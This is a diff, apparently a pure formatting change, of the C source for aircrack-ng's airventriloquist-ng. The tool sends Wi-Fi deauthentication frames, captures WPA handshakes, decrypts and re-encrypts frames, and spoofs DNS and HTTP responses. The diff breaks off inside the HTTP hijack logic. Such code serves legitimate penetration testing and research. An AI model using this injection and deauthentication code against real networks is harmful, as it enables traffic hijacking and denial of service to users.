@@ -142,30 +142,30 @@ int bitrates[RATE_NUM] = {RATE_1M,
 						  RATE_48M,
 						  RATE_54M};
 
-char *progname = NULL;
+char * progname = NULL;
 
-char usage[] =
-	"\n"
-	"  %s - (C) 2015 Tim de Waal\n"
-	"  https://www.aircrack-ng.org\n"
-	"\n"
-	"  usage: airventriloquist-ng [options]\n"
-	"\n"
-	"      -i <replay interface>   : Interface to listen and inject on\n"
-	"      -d | --deauth           : Send active deauths to encrypted "
-	"stations\n"
-	"      -e | --essid <value>    : ESSID of target network \n"
-	"      -p | --passphrase <val> : WPA Passphrase of target network\n"
-	"      -c | --icmp             : Respond to all ICMP frames (Debug)\n"
-	"      -n | --dns              : IP to resolve all DNS queries to\n"
-	"      -s | --hijack <URL>     : URL to look for in HTTP requests\n"
-	"                                <URL> can have wildcards\n"
-	"                                   eg: *jquery*.js*\n"
-	"      -r | --redirect <URL>   : URL to redirect to\n"
-	"      -v | --verbose          : Verbose output\n"
-	"      --help                  : This super helpful message\n"
-	"\n"
-	"\n";
+char usage[]
+	= "\n"
+	  "  %s - (C) 2015 Tim de Waal\n"
+	  "  https://www.aircrack-ng.org\n"
+	  "\n"
+	  "  usage: airventriloquist-ng [options]\n"
+	  "\n"
+	  "      -i <replay interface>   : Interface to listen and inject on\n"
+	  "      -d | --deauth           : Send active deauths to encrypted "
+	  "stations\n"
+	  "      -e | --essid <value>    : ESSID of target network \n"
+	  "      -p | --passphrase <val> : WPA Passphrase of target network\n"
+	  "      -c | --icmp             : Respond to all ICMP frames (Debug)\n"
+	  "      -n | --dns              : IP to resolve all DNS queries to\n"
+	  "      -s | --hijack <URL>     : URL to look for in HTTP requests\n"
+	  "                                <URL> can have wildcards\n"
+	  "                                   eg: *jquery*.js*\n"
+	  "      -r | --redirect <URL>   : URL to redirect to\n"
+	  "      -v | --verbose          : Verbose output\n"
+	  "      --help                  : This super helpful message\n"
+	  "\n"
+	  "\n";
 
 struct options
 {
@@ -189,15 +189,15 @@ struct options
 	char r_essid[33];
 	char r_smac_set;
 
-	char ip_out[16]; //16 for 15 chars + \x00
+	char ip_out[16]; // 16 for 15 chars + \x00
 	char ip_in[16];
 	int port_out;
 	int port_in;
 
-	char *iface_out;
-	char *s_face;
-	char *s_file;
-	uint8_t *prga;
+	char * iface_out;
+	char * s_face;
+	char * s_file;
+	uint8_t * prga;
 
 	int a_mode;
 	int a_count;
@@ -218,9 +218,9 @@ struct options
 	char flag_dnsspoof;
 	char deauth;
 	char flag_verbose;
-	char *p_redir_url;
-	char *p_redir_pkt_str;
-	char *p_hijack_str;
+	char * p_redir_url;
+	char * p_redir_pkt_str;
+	char * p_hijack_str;
 	unsigned long p_dnsspoof_ip;
 
 	// Copied from airdecap
@@ -233,9 +233,9 @@ struct options
 	int decap_weplen, crypt;
 	int decap_store_bad;
 
-	struct WPA_ST_info *st_1st;
-	struct WPA_ST_info *st_cur;
-	struct WPA_ST_info *st_prv;
+	struct WPA_ST_info * st_1st;
+	struct WPA_ST_info * st_cur;
+	struct WPA_ST_info * st_prv;
 } opt;
 
 struct devices
@@ -253,7 +253,7 @@ struct devices
 	int is_madwifing;
 	int is_bcm43xx;
 
-	FILE *f_cap_in;
+	FILE * f_cap_in;
 
 	struct pcap_file_header pfh_in;
 } dev;
@@ -262,7 +262,7 @@ static struct wif *_wi_in, *_wi_out;
 
 struct ARP_req
 {
-	u_int8_t *buf;
+	u_int8_t * buf;
 	int hdrlen;
 	int len;
 };
@@ -289,9 +289,9 @@ char strbuf[512];
 
 int ctrl_c, alarmed;
 
-char *iwpriv;
+char * iwpriv;
 
-static int set_bitrate(struct wif *wi, int rate)
+static int set_bitrate(struct wif * wi, int rate)
 {
 	int i, newrate;
 
@@ -300,7 +300,8 @@ static int set_bitrate(struct wif *wi, int rate)
 	//    if( reset_ifaces() )
 	//        return 1;
 
-	//Workaround for buggy drivers (rt73) that do not accept 5.5M, but 5M instead
+	// Workaround for buggy drivers (rt73) that do not accept 5.5M, but 5M
+	// instead
 	if (rate == 5500000 && wi_get_rate(wi) != 5500000)
 	{
 		if (wi_set_rate(wi, 5000000)) return 1;
@@ -348,30 +349,30 @@ static int set_bitrate(struct wif *wi, int rate)
 	return 0;
 }
 
-static int send_packet(void *buf, u_int32_t count)
+static int send_packet(void * buf, u_int32_t count)
 {
-	struct wif *wi = _wi_out; /* XXX globals suck */
-	u_int8_t *pkt = (u_int8_t *) buf;
+	struct wif * wi = _wi_out; /* XXX globals suck */
+	u_int8_t * pkt = (u_int8_t *) buf;
 
-	//setting sequence numbers... Don' want to do this for our purposes...
+	// setting sequence numbers... Don' want to do this for our purposes...
 	// One main reason for this is because IF this is an encrypted frame
 	// then the sequence number is used in the encryption, so changing it here
 	// will break it. It won't be able to be decrypted...
 	/*
-    if( (count > 24) && (pkt[1] & 0x04) == 0 && (pkt[22] & 0x0F) == 0)
-    {
-        pkt[22] = (nb_pkt_sent & 0x0000000F) << 4;
-        pkt[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
-    }
-    */
+	if( (count > 24) && (pkt[1] & 0x04) == 0 && (pkt[22] & 0x0F) == 0)
+	{
+		pkt[22] = (nb_pkt_sent & 0x0000000F) << 4;
+		pkt[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
+	}
+	*/
 
 	if ((count > 24))
 	{
-		//Set the duration...
+		// Set the duration...
 		pkt[2] = 0x3A;
 		pkt[3] = 0x01;
 
-		//Reset Retry Flag
+		// Reset Retry Flag
 		pkt[1] = pkt[1] & ~0x4;
 	}
 
@@ -394,9 +395,9 @@ static int send_packet(void *buf, u_int32_t count)
 	return 0;
 }
 
-static int read_packet(void *buf, u_int32_t count, struct rx_info *ri)
+static int read_packet(void * buf, u_int32_t count, struct rx_info * ri)
 {
-	struct wif *wi = _wi_in; /* XXX */
+	struct wif * wi = _wi_in; /* XXX */
 	int rc;
 
 	rc = wi_read(wi, buf, count, ri);
@@ -415,7 +416,7 @@ static int read_packet(void *buf, u_int32_t count, struct rx_info *ri)
 	return rc;
 }
 
-static int wait_for_beacon(uint8_t *bssid, uint8_t *capa, char *essid)
+static int wait_for_beacon(uint8_t * bssid, uint8_t * capa, char * essid)
 {
 	int len = 0, chan = 0, taglen = 0, tagtype = 0, pos = 0;
 	uint8_t pkt_sniff[4096];
@@ -433,7 +434,7 @@ static int wait_for_beacon(uint8_t *bssid, uint8_t *capa, char *essid)
 			gettimeofday(&tv2, NULL);
 			if (((tv2.tv_sec - tv.tv_sec) * 1000000)
 					+ (tv2.tv_usec - tv.tv_usec)
-				> 10000 * 1000) //wait 10sec for beacon frame
+				> 10000 * 1000) // wait 10sec for beacon frame
 			{
 				return -1;
 			}
@@ -442,8 +443,8 @@ static int wait_for_beacon(uint8_t *bssid, uint8_t *capa, char *essid)
 		if (!memcmp(pkt_sniff, "\x80", 1))
 		{
 			pos = 0;
-			taglen = 22; //initial value to get the fixed tags parsing started
-			taglen += 12; //skip fixed tags in frames
+			taglen = 22;  // initial value to get the fixed tags parsing started
+			taglen += 12; // skip fixed tags in frames
 			do
 			{
 				pos += taglen + 2;
@@ -460,9 +461,9 @@ static int wait_for_beacon(uint8_t *bssid, uint8_t *capa, char *essid)
 			if (essid)
 			{
 				pos = 0;
-				taglen =
-					22; //initial value to get the fixed tags parsing started
-				taglen += 12; //skip fixed tags in frames
+				taglen
+					= 22; // initial value to get the fixed tags parsing started
+				taglen += 12; // skip fixed tags in frames
 				do
 				{
 					pos += taglen + 2;
@@ -497,7 +498,8 @@ static int wait_for_beacon(uint8_t *bssid, uint8_t *capa, char *essid)
 					break;
 				}
 
-				/* if essid is given, copy bssid AND essid, so we can handle case insensitive arguments */
+				/* if essid is given, copy bssid AND essid, so we can handle
+				 * case insensitive arguments */
 				if (bssid != NULL && memcmp(bssid, NULL_MAC, 6) == 0
 					&& strncasecmp(essid, (char *) pkt_sniff + pos + 2, taglen)
 						   == 0
@@ -557,10 +559,10 @@ static int wait_for_beacon(uint8_t *bssid, uint8_t *capa, char *essid)
 }
 
 /**
-    if bssid != NULL its looking for a beacon frame
+	if bssid != NULL its looking for a beacon frame
 */
 static int
-attack_check(uint8_t *bssid, char *essid, uint8_t *capa, struct wif *wi)
+attack_check(uint8_t * bssid, char * essid, uint8_t * capa, struct wif * wi)
 {
 	int ap_chan = 0, iface_chan = 0;
 
@@ -600,9 +602,9 @@ attack_check(uint8_t *bssid, char *essid, uint8_t *capa, struct wif *wi)
 	return 0;
 }
 
-static int getnet(uint8_t *capa, int filter, int force)
+static int getnet(uint8_t * capa, int filter, int force)
 {
-	u_int8_t *bssid;
+	u_int8_t * bssid;
 
 	if (filter)
 		bssid = opt.f_bssid;
@@ -668,10 +670,10 @@ static int getnet(uint8_t *capa, int filter, int force)
 	return 0;
 }
 
-static int get_ip_port(char *iface, char *ip, const int ip_size)
+static int get_ip_port(char * iface, char * ip, const int ip_size)
 {
-	char *host;
-	char *ptr;
+	char * host;
+	char * ptr;
 	int port = -1;
 	struct in_addr addr;
 
@@ -700,7 +702,7 @@ out:
 	return port;
 }
 
-static int tcp_test(const char *ip_str, const short port)
+static int tcp_test(const char * ip_str, const short port)
 {
 	int sock, i;
 	struct sockaddr_in s_in;
@@ -733,7 +735,7 @@ static int tcp_test(const char *ip_str, const short port)
 
 	gettimeofday(&tv, NULL);
 
-	while (1) //waiting for relayed packet
+	while (1) // waiting for relayed packet
 	{
 		if (connect(sock, (struct sockaddr *) &s_in, sizeof(s_in)) == -1)
 		{
@@ -754,7 +756,7 @@ static int tcp_test(const char *ip_str, const short port)
 		}
 
 		gettimeofday(&tv2, NULL);
-		//wait 3000ms for a successful connect
+		// wait 3000ms for a successful connect
 		if (((tv2.tv_sec * 1000000 - tv.tv_sec * 1000000)
 			 + (tv2.tv_usec - tv.tv_usec))
 			> (3000 * 1000))
@@ -769,7 +771,7 @@ static int tcp_test(const char *ip_str, const short port)
 	PCT;
 	printf("TCP connection successful\n");
 
-	//trying to identify airserv-ng
+	// trying to identify airserv-ng
 	memset(&nh, 0, sizeof(nh));
 	//     command: GET_CHAN
 	nh.nh_type = 2;
@@ -785,7 +787,7 @@ static int tcp_test(const char *ip_str, const short port)
 	gettimeofday(&tv, NULL);
 	i = 0;
 
-	while (1) //waiting for GET_CHAN answer
+	while (1) // waiting for GET_CHAN answer
 	{
 		caplen = read(sock, &nh, sizeof(nh));
 
@@ -823,7 +825,7 @@ static int tcp_test(const char *ip_str, const short port)
 		}
 
 		gettimeofday(&tv2, NULL);
-		//wait 1000ms(1sec) for an answer
+		// wait 1000ms(1sec) for an answer
 		if (((tv2.tv_sec * 1000000 - tv.tv_sec * 1000000)
 			 + (tv2.tv_usec - tv.tv_usec))
 			> (1000 * 1000))
@@ -863,7 +865,7 @@ static int tcp_test(const char *ip_str, const short port)
 
 		gettimeofday(&tv, NULL);
 
-		while (1) //waiting for relayed packet
+		while (1) // waiting for relayed packet
 		{
 			if (connect(sock, (struct sockaddr *) &s_in, sizeof(s_in)) == -1)
 			{
@@ -884,14 +886,14 @@ static int tcp_test(const char *ip_str, const short port)
 			}
 
 			gettimeofday(&tv2, NULL);
-			//wait 1000ms for a successful connect
+			// wait 1000ms for a successful connect
 			if (((tv2.tv_sec * 1000000 - tv.tv_sec * 1000000)
 				 + (tv2.tv_usec - tv.tv_usec))
 				> (1000 * 1000))
 			{
 				break;
 			}
-			//simple "high-precision" usleep
+			// simple "high-precision" usleep
 			select(1, NULL, NULL, NULL, &tv3);
 		}
 		times[i] = ((tv2.tv_sec * 1000000 - tv.tv_sec * 1000000)
@@ -924,9 +926,9 @@ static int tcp_test(const char *ip_str, const short port)
 	return 0;
 }
 
-//TODO: this function is hacked together, It should be cleaned up
+// TODO: this function is hacked together, It should be cleaned up
 // Need to use wfrm (ieee80211_frame struct instead of just a buffer)
-static int deauth_station(struct WPA_ST_info *st_cur)
+static int deauth_station(struct WPA_ST_info * st_cur)
 {
 	if (memcmp(st_cur->stmac, NULL_MAC, 6) != 0)
 	{
@@ -953,14 +955,15 @@ static int deauth_station(struct WPA_ST_info *st_cur)
 
 			if (send_packet(h80211, 26) < 0) return (1);
 
-			//usleep(2000);
+			// usleep(2000);
 
-			//Send deauth to the AP...
+			// Send deauth to the AP...
 			memcpy(h80211 + 4, st_cur->bssid, 6);
 			memcpy(h80211 + 10, st_cur->stmac, 6);
 
 			if (send_packet(h80211, 26) < 0) return (1);
-			//Usually this is where we would wait for an ACK, but we need to get back
+			// Usually this is where we would wait for an ACK, but we need to
+			// get back
 			// to capturing packets to get the EAPOL 4 way handshake
 		}
 		return (0);
@@ -969,12 +972,12 @@ static int deauth_station(struct WPA_ST_info *st_cur)
 	return (0);
 }
 
-//Shameless copy from tshark/wireshark?
-static void hexDump(char *desc, void *addr, int len)
+// Shameless copy from tshark/wireshark?
+static void hexDump(char * desc, void * addr, int len)
 {
 	int i;
 	u_int8_t buff[17];
-	u_int8_t *pc = (u_int8_t *) addr;
+	u_int8_t * pc = (u_int8_t *) addr;
 
 	// Output description if given.
 	if (desc != NULL) printf("%s:\n", desc);
@@ -1018,35 +1021,35 @@ static void hexDump(char *desc, void *addr, int len)
 /* calcsum - used to calculate IP and ICMP header checksums using
  * one's compliment of the one's compliment sum of 16 bit words of the header
  */
-static u_int16_t calcsum(u_int16_t *buffer, u_int32_t length)
+static u_int16_t calcsum(u_int16_t * buffer, u_int32_t length)
 {
 	u_int32_t sum;
 
 	// initialize sum to zero and loop until length (in words) is 0
-	for (
-		sum = 0; length > 1;
-		length -=
-		2) // sizeof() returns number of bytes, we're interested in number of words
+	for (sum = 0; length > 1; length -= 2) // sizeof() returns number of bytes,
+										   // we're interested in number of
+										   // words
 		sum += *buffer++; // add 1 word of buffer to sum and proceed to the next
 
 	// we may have an extra byte
 	if (length == 1) sum += (u_int8_t) *buffer;
 
 	sum = (sum >> 16) + (sum & 0xFFFF); // add high 16 to low 16
-	sum += (sum >> 16); // add carry
+	sum += (sum >> 16);					// add carry
 	return ~sum;
 }
-//This needs to be cleaned up so that we can do UDP/TCP in one function. Don't want to do that now and risk
+// This needs to be cleaned up so that we can do UDP/TCP in one function. Don't
+// want to do that now and risk
 // breaking UDP checksums right now
-static u_int16_t calcsum_tcp(u_int16_t *buf,
+static u_int16_t calcsum_tcp(u_int16_t * buf,
 							 u_int32_t len,
 							 u_int32_t src_addr,
 							 u_int32_t dest_addr)
 {
 	u_int32_t chksum;
 	u_int32_t length = len;
-	u_int16_t *ip_src = (u_int16_t *) &src_addr;
-	u_int16_t *ip_dst = (u_int16_t *) &dest_addr;
+	u_int16_t * ip_src = (u_int16_t *) &src_addr;
+	u_int16_t * ip_dst = (u_int16_t *) &dest_addr;
 
 	// Calculate the chksum
 	chksum = 0;
@@ -1077,15 +1080,15 @@ static u_int16_t calcsum_tcp(u_int16_t *buf,
 	return ((u_int16_t)(~chksum));
 }
 
-static u_int16_t calcsum_udp(u_int16_t *buf,
+static u_int16_t calcsum_udp(u_int16_t * buf,
 							 u_int32_t len,
 							 u_int32_t src_addr,
 							 u_int32_t dest_addr)
 {
 	u_int32_t chksum;
 	u_int32_t length = len;
-	u_int16_t *ip_src = (u_int16_t *) &src_addr;
-	u_int16_t *ip_dst = (u_int16_t *) &dest_addr;
+	u_int16_t * ip_src = (u_int16_t *) &src_addr;
+	u_int16_t * ip_dst = (u_int16_t *) &dest_addr;
 
 	// Calculate the chksum
 	chksum = 0;
@@ -1116,16 +1119,16 @@ static u_int16_t calcsum_udp(u_int16_t *buf,
 	return ((u_int16_t)(~chksum));
 }
 
-static inline u_int8_t *packet_get_sta_80211(u_int8_t *pkt)
+static inline u_int8_t * packet_get_sta_80211(u_int8_t * pkt)
 {
-	struct ieee80211_frame *p_res802 = (struct ieee80211_frame *) pkt;
+	struct ieee80211_frame * p_res802 = (struct ieee80211_frame *) pkt;
 
-	//IF TODS
+	// IF TODS
 	if (p_res802->i_fc[1] & IEEE80211_FC1_DIR_TODS)
 	{
 		return (u_int8_t *) &p_res802->i_addr2;
 	}
-	//IF FROMDS
+	// IF FROMDS
 	else if (p_res802->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
 	{
 		return (u_int8_t *) &p_res802->i_addr1;
@@ -1134,16 +1137,16 @@ static inline u_int8_t *packet_get_sta_80211(u_int8_t *pkt)
 	return NULL;
 }
 
-static inline u_int8_t *packet_get_bssid_80211(u_int8_t *pkt)
+static inline u_int8_t * packet_get_bssid_80211(u_int8_t * pkt)
 {
-	struct ieee80211_frame *p_res802 = (struct ieee80211_frame *) pkt;
+	struct ieee80211_frame * p_res802 = (struct ieee80211_frame *) pkt;
 
-	//IF TODS
+	// IF TODS
 	if (p_res802->i_fc[1] & IEEE80211_FC1_DIR_TODS)
 	{
 		return (u_int8_t *) &p_res802->i_addr1;
 	}
-	//IF FROMDS
+	// IF FROMDS
 	else if (p_res802->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
 	{
 		return (u_int8_t *) &p_res802->i_addr2;
@@ -1152,18 +1155,18 @@ static inline u_int8_t *packet_get_bssid_80211(u_int8_t *pkt)
 	return NULL;
 }
 
-static void packet_turnaround_80211(u_int8_t *pkt)
+static void packet_turnaround_80211(u_int8_t * pkt)
 {
-	struct ieee80211_frame *p_res802 = (struct ieee80211_frame *) pkt;
+	struct ieee80211_frame * p_res802 = (struct ieee80211_frame *) pkt;
 	u_int8_t tmp_mac[IEEE80211_ADDR_LEN] = {0};
 
-	//IF TODS, flip to FROMDS
+	// IF TODS, flip to FROMDS
 	if (p_res802->i_fc[1] & IEEE80211_FC1_DIR_TODS)
 	{
 		p_res802->i_fc[1] = p_res802->i_fc[1] & ~(char) IEEE80211_FC1_DIR_TODS;
 		p_res802->i_fc[1] = p_res802->i_fc[1] | IEEE80211_FC1_DIR_FROMDS;
 	}
-	//IF FROMDS, Flip to TODS
+	// IF FROMDS, Flip to TODS
 	else if (p_res802->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
 	{
 		p_res802->i_fc[1] = p_res802->i_fc[1] & ~IEEE80211_FC1_DIR_FROMDS;
@@ -1177,27 +1180,27 @@ static void packet_turnaround_80211(u_int8_t *pkt)
 	return;
 }
 
-static void packet_turnaround_ip(struct ip_frame *p_resip)
+static void packet_turnaround_ip(struct ip_frame * p_resip)
 {
-	//Switch the IP source and destination addresses
+	// Switch the IP source and destination addresses
 	u_int32_t tmp_addr = p_resip->saddr;
 	p_resip->saddr = p_resip->daddr;
 	p_resip->daddr = tmp_addr;
 	p_resip->ttl = 63;
 }
 
-static void packet_turnaround_ip_udp(struct udp_hdr *p_resudp)
+static void packet_turnaround_ip_udp(struct udp_hdr * p_resudp)
 {
-	//Switch the UDP source and destination Ports
+	// Switch the UDP source and destination Ports
 	u_int16_t tmp_port = p_resudp->sport;
 	p_resudp->sport = p_resudp->dport;
 	p_resudp->dport = tmp_port;
 }
 
-static void packet_turnaround_ip_tcp(struct tcp_hdr *p_restcp,
+static void packet_turnaround_ip_tcp(struct tcp_hdr * p_restcp,
 									 u_int32_t next_seq_hint)
 {
-	//Switch the TCP source and destination Ports
+	// Switch the TCP source and destination Ports
 	u_int16_t tmp_port = p_restcp->sport;
 	p_restcp->sport = p_restcp->dport;
 	p_restcp->dport = tmp_port;
@@ -1212,9 +1215,9 @@ static void packet_turnaround_ip_tcp(struct tcp_hdr *p_restcp,
 	p_restcp->ack_seq = htonl(tmp_num);
 }
 
-static u_int16_t dns_name_end(u_int8_t *buff, u_int16_t maxlen)
+static u_int16_t dns_name_end(u_int8_t * buff, u_int16_t maxlen)
 {
-	u_int8_t *ptr = buff;
+	u_int8_t * ptr = buff;
 	u_int8_t count = 0;
 	u_int16_t offset = 0;
 
@@ -1230,7 +1233,7 @@ static u_int16_t dns_name_end(u_int8_t *buff, u_int16_t maxlen)
 	return offset;
 }
 
-static int strip_ccmp_header(u_int8_t *h80211, int caplen, unsigned char PN[6])
+static int strip_ccmp_header(u_int8_t * h80211, int caplen, unsigned char PN[6])
 {
 	int is_a4, z, is_qos;
 
@@ -1240,7 +1243,7 @@ static int strip_ccmp_header(u_int8_t *h80211, int caplen, unsigned char PN[6])
 	z += 2 * is_qos;
 
 	// Insert CCMP header
-	//memmove( h80211+z+8, h80211+z, caplen-z );
+	// memmove( h80211+z+8, h80211+z, caplen-z );
 	PN[5] = h80211[z + 0];
 	PN[4] = h80211[z + 1];
 	PN[3] = h80211[z + 4];
@@ -1249,13 +1252,14 @@ static int strip_ccmp_header(u_int8_t *h80211, int caplen, unsigned char PN[6])
 	PN[0] = h80211[z + 7];
 	memmove(h80211 + z, h80211 + z + 8, caplen - z);
 
-	//return new length, encrypt_ccmp() expects on encryption artifacts in frame,
+	// return new length, encrypt_ccmp() expects on encryption artifacts in
+	// frame,
 	// and states frame is encrypted in place resulting in extra 16 bytes?
 	return caplen - 16;
 }
 
 static void
-encrypt_data_packet(u_int8_t *packet, int length, struct WPA_ST_info *sta_cur)
+encrypt_data_packet(u_int8_t * packet, int length, struct WPA_ST_info * sta_cur)
 {
 	if ((NULL == sta_cur) || (!sta_cur->valid_ptk))
 	{
@@ -1266,14 +1270,14 @@ encrypt_data_packet(u_int8_t *packet, int length, struct WPA_ST_info *sta_cur)
 		// if the PTK is valid, try to decrypt
 		if (sta_cur->keyver == 1)
 		{
-			//printf("TKIP packet length = %d\n", length );
-			//hexDump("full before encrypt", packet, length);
+			// printf("TKIP packet length = %d\n", length );
+			// hexDump("full before encrypt", packet, length);
 			encrypt_tkip(packet, length, sta_cur->ptk);
 		}
 		else
 		{
-			//printf("CCMP Packet\n");
-			//This will take the current packet that already
+			// printf("CCMP Packet\n");
+			// This will take the current packet that already
 			// has a ccmp header and strip it and return the PN
 			// This is required so that we comply with the
 			// encrypt_ccmp function in crypto.c
@@ -1284,59 +1288,61 @@ encrypt_data_packet(u_int8_t *packet, int length, struct WPA_ST_info *sta_cur)
 	}
 }
 
-//Global packet buffer for use in building response packets
+// Global packet buffer for use in building response packets
 uint8_t pkt[2048] = {0};
 
-static void process_unencrypted_data_packet(u_int8_t *packet,
+static void process_unencrypted_data_packet(u_int8_t * packet,
 											u_int32_t length,
 											u_int32_t debug)
 {
 	if (debug) hexDump("full", packet, length);
 
-	u_int8_t *packet_start = packet;
+	u_int8_t * packet_start = packet;
 	int packet_start_length = length;
 	char extra_enc_length = 0;
-	//char flag_reencypt
+	// char flag_reencypt
 
-	struct ieee80211_frame *wfrm = (struct ieee80211_frame *) packet;
+	struct ieee80211_frame * wfrm = (struct ieee80211_frame *) packet;
 
 	int size_80211hdr = sizeof(struct ieee80211_frame);
 
-	//Check to see if we have a QOS 802.11 frame
+	// Check to see if we have a QOS 802.11 frame
 	if (IEEE80211_FC0_SUBTYPE_QOS & wfrm->i_fc[0])
 	{
 		size_80211hdr = sizeof(struct ieee80211_qosframe);
-		//Here's an idea from a presentation out of NL, assign this packet
+		// Here's an idea from a presentation out of NL, assign this packet
 		// a QOS priority that isn't used in order to not collide with
 		// squence numbers from the real AP/STA
-		struct ieee80211_qosframe *wqfrm = (struct ieee80211_qosframe *) packet;
+		struct ieee80211_qosframe * wqfrm
+			= (struct ieee80211_qosframe *) packet;
 		wqfrm->i_qos[0] = 0x7;
 	}
 
-	//Increment the 802.11 sequence number
-	uint16_t *p_seq = (uint16_t *) &wfrm->i_seq;
+	// Increment the 802.11 sequence number
+	uint16_t * p_seq = (uint16_t *) &wfrm->i_seq;
 	uint16_t pkt_sent = (*p_seq) >> 4;
 	pkt_sent += 1;
-	//printf("seq = %d\n", pkt_sent);
+	// printf("seq = %d\n", pkt_sent);
 	packet[22] = (pkt_sent & 0x0000000F) << 4;
 	packet[23] = (pkt_sent & 0x00000FF0) >> 4;
 
-	//Skip over the 802.11 header
+	// Skip over the 802.11 header
 	packet += size_80211hdr;
 	length -= size_80211hdr;
 
-	// If the protected bit is set, we decrypted this packet and passed it on here
+	// If the protected bit is set, we decrypted this packet and passed it on
+	// here
 	// Calculate the correct offset to the start of the data
 	if (IEEE80211_FC1_WEP & wfrm->i_fc[1])
 	{
 		if (0 == (packet[3] & 0x20))
 		{
-			//this is a regular WEP IV field
+			// this is a regular WEP IV field
 			extra_enc_length = 4;
 		}
 		else
 		{
-			//this is a Extended IV field
+			// this is a Extended IV field
 			extra_enc_length = 8;
 		}
 		packet += extra_enc_length;
@@ -1344,7 +1350,7 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 		size_80211hdr += extra_enc_length;
 	}
 
-	struct llc_frame *p_llc = (struct llc_frame *) packet;
+	struct llc_frame * p_llc = (struct llc_frame *) packet;
 	if (debug) hexDump("llc", p_llc, length);
 	packet += sizeof(struct llc_frame);
 	length -= sizeof(struct llc_frame);
@@ -1355,9 +1361,9 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 		// If it's an EAPOL frame, let's capture the handshake
 		if (ETHTYPE_8021x == p_llc->i_ethtype)
 		{
-			struct dot1x_hdr *p_d1x = (struct dot1x_hdr *) packet;
-			struct radius_hdr *p_rhdr =
-				(struct radius_hdr *) (packet + sizeof(struct dot1x_hdr));
+			struct dot1x_hdr * p_d1x = (struct dot1x_hdr *) packet;
+			struct radius_hdr * p_rhdr
+				= (struct radius_hdr *) (packet + sizeof(struct dot1x_hdr));
 
 			// Must be a key frame, and must be RSN (2) or WPA (254)
 			if ((DOT1X_ID_EAP_KEY != p_d1x->idtype)
@@ -1366,7 +1372,8 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 				return;
 			}
 
-			// frame 1 of 4: Pairwise == 1, Install == 0, Ack == 1, MIC == 0, Secure == 0 */
+			// frame 1 of 4: Pairwise == 1, Install == 0, Ack == 1, MIC == 0,
+			// Secure == 0 */
 			if (1 == p_rhdr->key_type && 0 == p_rhdr->key_install
 				&& 1 == p_rhdr->key_ack
 				&& 0 == p_rhdr->key_mic)
@@ -1377,8 +1384,10 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 				PRINTMAC(opt.st_cur->stmac);
 			}
 
-			/* frame 2 of 4: Pairwise == 1, Install == 0, Ack == 0, MIC == 1, Secure == 0 */
-			/* frame 4 of 4: Pairwise == 1, Install == 0, Ack == 0, MIC == 1, Secure == 1 */
+			/* frame 2 of 4: Pairwise == 1, Install == 0, Ack == 0, MIC == 1,
+			 * Secure == 0 */
+			/* frame 4 of 4: Pairwise == 1, Install == 0, Ack == 0, MIC == 1,
+			 * Secure == 1 */
 			if (1 == p_rhdr->key_type && 0 == p_rhdr->key_install
 				&& 0 == p_rhdr->key_ack
 				&& 1 == p_rhdr->key_mic)
@@ -1395,8 +1404,8 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 				}
 				PRINTMAC(opt.st_cur->stmac);
 
-				opt.st_cur->eapol_size =
-					ntohs(p_d1x->length) + 4; //4 is sizeof radius header
+				opt.st_cur->eapol_size
+					= ntohs(p_d1x->length) + 4; // 4 is sizeof radius header
 
 				if (length < opt.st_cur->eapol_size
 					|| opt.st_cur->eapol_size == 0
@@ -1420,7 +1429,8 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 				opt.st_cur->keyver = p_rhdr->key_ver;
 			}
 
-			/* frame 3 of 4: Pairwise == 1, Install == 1, Ack == 1, MIC == 1, Secure == 1 */
+			/* frame 3 of 4: Pairwise == 1, Install == 1, Ack == 1, MIC == 1,
+			 * Secure == 1 */
 			if (1 == p_rhdr->key_type && 1 == p_rhdr->key_install
 				&& 1 == p_rhdr->key_ack
 				&& 1 == p_rhdr->key_mic)
@@ -1432,9 +1442,9 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 					printf(COL_4WAYHS "------> #3, Captured anonce " COL_REST);
 					PRINTMAC(opt.st_cur->stmac);
 				}
-				//WARNING: Serious Code Reuse here!!!
-				opt.st_cur->eapol_size =
-					ntohs(p_d1x->length) + 4; //4 is sizeof radius header
+				// WARNING: Serious Code Reuse here!!!
+				opt.st_cur->eapol_size
+					= ntohs(p_d1x->length) + 4; // 4 is sizeof radius header
 
 				if (length < opt.st_cur->eapol_size
 					|| opt.st_cur->eapol_size == 0
@@ -1460,7 +1470,7 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 
 			memset(opt.st_cur->ptk, 0, 80);
 
-			//opt.st_cur->valid_ptk = calc_ptk( opt.st_cur, opt.st_cur->pmk );
+			// opt.st_cur->valid_ptk = calc_ptk( opt.st_cur, opt.st_cur->pmk );
 			opt.st_cur->valid_ptk = calc_ptk(opt.st_cur, opt.pmk);
 			if (1 == opt.st_cur->valid_ptk)
 			{
@@ -1492,26 +1502,27 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 		}
 		else if ((short) ETHTYPE_IP == p_llc->i_ethtype)
 		{
-			//We have an IP frame
+			// We have an IP frame
 			int offset_ip = size_80211hdr + sizeof(struct llc_frame);
 			int offset_proto = offset_ip + sizeof(struct ip_frame);
 
-			struct ip_frame *p_ip = (struct ip_frame *) packet;
+			struct ip_frame * p_ip = (struct ip_frame *) packet;
 			packet += sizeof(struct ip_frame);
 			length -= sizeof(struct ip_frame);
 
 			if ((short) PROTO_TCP == p_ip->protocol)
 			{
 
-				struct tcp_hdr *p_tcp = (struct tcp_hdr *) packet;
+				struct tcp_hdr * p_tcp = (struct tcp_hdr *) packet;
 				if (80 == ntohs(p_tcp->dport))
 				{
 					length += extra_enc_length;
-					// TCP header size = first 4bits * 32 / 8, same as first 4bits *4
+					// TCP header size = first 4bits * 32 / 8, same as first
+					// 4bits *4
 					u_int32_t hdr_size = p_tcp->doff * 4;
-					u_int8_t *p_http = packet + hdr_size;
+					u_int8_t * p_http = packet + hdr_size;
 					u_int32_t l_http = length - hdr_size;
-					//Find a GET
+					// Find a GET
 					if ((1 == opt.flag_http_hijack)
